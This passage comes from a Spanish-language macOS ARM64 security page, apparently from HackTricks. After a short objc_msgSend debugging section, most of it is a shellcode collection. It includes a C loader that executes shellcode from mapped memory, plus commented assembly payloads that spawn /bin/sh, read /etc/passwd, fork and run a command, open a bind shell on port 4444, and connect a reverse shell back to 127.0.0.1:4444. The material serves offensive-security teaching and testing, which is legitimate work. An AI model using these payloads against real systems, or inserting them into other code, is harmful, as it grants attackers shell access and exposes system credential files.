(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Al establecer la variable de entorno **`NSObjCMessageLoggingEnabled=1`**, es posible registrar cuándo se llama a esta función en un archivo como `/tmp/msgSends-pid`.
>
> Además, al establecer **`OBJC_HELP=1`** y llamar a cualquier binary, puedes ver otras variables de entorno que podrías utilizar para **registrar** cuándo ocurren determinadas acciones de Objc-C.

Cuando se llama a esta función, es necesario encontrar el método llamado de la instancia indicada. Para ello, se realizan diferentes búsquedas:

- Realizar una búsqueda optimista en la cache:
- Si tiene éxito, finalizar
- Adquirir runtimeLock (lectura)
- Si (realize && !cls->realized), realizar la clase
- Si (initialize && !cls->initialized), inicializar la clase
- Intentar con la cache propia de la clase:
- Si tiene éxito, finalizar
- Intentar con la lista de métodos de la clase:
- Si se encuentra, rellenar la cache y finalizar
- Intentar con la cache de la superclass:
- Si tiene éxito, finalizar
- Intentar con la lista de métodos de la superclass:
- Si se encuentra, rellenar la cache y finalizar
- Si (resolver), intentar con el method resolver y repetir desde la búsqueda de la clase
- Si todavía estamos aquí (= todo lo demás ha fallado), intentar con el forwarder

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para versiones más recientes de macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Código en C para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**aquí**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) y explicado.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es un array de parámetros (que en memoria significa una pila de direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar un comando con sh desde un fork para que el proceso principal no sea terminado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) en el **puerto 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

De [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Referencias

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
